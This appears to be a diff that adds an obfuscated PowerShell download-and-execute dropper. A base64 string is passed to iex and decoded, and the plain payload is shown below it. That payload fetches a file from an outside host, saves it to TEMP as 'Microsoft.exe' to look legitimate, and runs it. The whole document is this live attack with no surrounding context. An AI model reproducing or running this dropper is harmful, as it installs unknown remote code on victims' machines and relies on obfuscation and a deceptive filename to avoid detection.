@@ -1,0 +1,7 @@
+iex([sYsTeM.TexT.EnCoDiNG]::utF8.GETStrING([SysteM.coNVeRT]::fROmBASE64sTRIng('CihOZXctT2JqZWN0IFNZU1RFTS5ORXQuV2VCQ0xJZU5UKS5Eb3dubG9hZGZpTEUoJ2h0dHA6Ly9obm5nLm1vZS9mL0lvdCcsIiRlblY6VEVNUFxNaWNyb3NvZnQuZXhlIik7U3RhcnQtUHJvY2VzcyAoIiRlblY6VEVNUFxNaWNyb3NvZnQuZXhlIikKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYSTEM.NEt.WeBCLIeNT).DownloadfiLE('http://hnng.moe/f/Iot',"$enV:TEMP\Microsoft.exe");Start-Process ("$enV:TEMP\Microsoft.exe")
+
